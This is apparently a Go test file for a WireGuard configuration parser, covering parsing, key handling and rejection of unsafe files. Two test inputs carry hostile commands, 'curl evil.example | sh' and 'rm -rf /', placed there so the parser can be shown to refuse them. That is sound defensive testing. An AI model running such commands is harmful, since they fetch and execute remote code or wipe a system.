package wireguard

import (
	"strings"
	"testing"
)

// The keys below are made-up examples from the WireGuard documentation.
const exampleConf = `# From the VPN provider
[Interface]
PrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=
Address = 10.66.0.2/32, fd00:66::2/128
DNS = 10.66.0.1, vpn.lan
ListenPort = 51820

[Peer]
PublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=
PresharedKey = /UwcSPg38hW/D9Y3tcS1FOV0K1wuURMbS0sesJEP5ak=
Endpoint = vpn.example.com:51820
AllowedIPs = 0.0.0.0/0, ::/0
PersistentKeepalive = 25
`

func TestParseConf_Example(t *testing.T) {
	c, err := ParseConf(exampleConf)
	if err != nil {
		t.Fatal(err)
	}
	if len(c.Addresses) != 2 || c.Addresses[0].String() != "10.66.0.2/32" {
		t.Errorf("addresses = %v", c.Addresses)
	}
	if len(c.DNS) != 1 || c.DNS[0].String() != "10.66.0.1" {
		t.Errorf("DNS = %v (search domains are ignored)", c.DNS)
	}
	if c.Peer.Endpoint != "vpn.example.com:51820" || !c.Peer.HasPresharedKey {
		t.Errorf("peer = %+v", c.Peer)
	}
	if !c.CarriesIPv6() || c.EffectiveMTU() != 1380 || c.EffectiveKeepalive() != 25 {
		t.Errorf("IPv6 %v, MTU %d, keepalive %d", c.CarriesIPv6(), c.EffectiveMTU(), c.EffectiveKeepalive())
	}
	if c.PrivateKey.String() != "yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=" {
		t.Error("private key not kept")
	}
}

func TestParseConf_RefusesUnsafeOrUnsupportedFiles(t *testing.T) {
	// Each case changes one line of the example file.
	tests := []struct{ name, find, replace string }{
		{"PostUp runs commands", "ListenPort = 51820", "PostUp = curl evil.example | sh"},
		{"Table changes routing", "ListenPort = 51820", "Table = off"},
		{"second peer", "PersistentKeepalive = 25", "PersistentKeepalive = 25\n[Peer]\nPublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg="},
		{"split tunnel", "AllowedIPs = 0.0.0.0/0, ::/0", "AllowedIPs = 10.0.0.0/8"},
		{"no DNS server", "DNS = 10.66.0.1, vpn.lan", "DNS = vpn.lan"},
		{"endpoint without port", "Endpoint = vpn.example.com:51820", "Endpoint = vpn.example.com"},
		{"bad key", "PublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=", "PublicKey = hello"},
		{"unknown setting", "ListenPort = 51820", "Colour = blue"},
		{"line without equals", "ListenPort = 51820", "ListenPort"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			conf := strings.Replace(exampleConf, tt.find, tt.replace, 1)
			if _, err := ParseConf(conf); err == nil {
				t.Errorf("accepted:\n%s", conf)
			}
		})
	}
}

func TestParseConf_ErrorMentionsLine(t *testing.T) {
	_, err := ParseConf(strings.Replace(exampleConf, "ListenPort = 51820", "PostDown = rm -rf /", 1))
	if err == nil || !strings.Contains(err.Error(), "Line 6") {
		t.Errorf("got %v, want an error on line 6", err)
	}
}

func TestKeys(t *testing.T) {
	// Test vector: this private key belongs to this public key (computed
	// with `wg pubkey`).
	private, err := ParseKey("yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=")
	if err != nil {
		t.Fatal(err)
	}
	if got := private.PublicKey().String(); got != "HIgo9xNzJMWLKASShiTqIybxZ0U3wGLiUeJ1PKf8ykw=" {
		t.Errorf("public key = %s", got)
	}

	generated, err := GeneratePrivateKey()
	if err != nil {
		t.Fatal(err)
	}
	if generated[0]&7 != 0 || generated[31]&128 != 0 || generated[31]&64 == 0 {
		t.Error("generated key is not clamped")
	}
	if _, err := ParseKey("short"); err == nil {
		t.Error("short key accepted")
	}
}
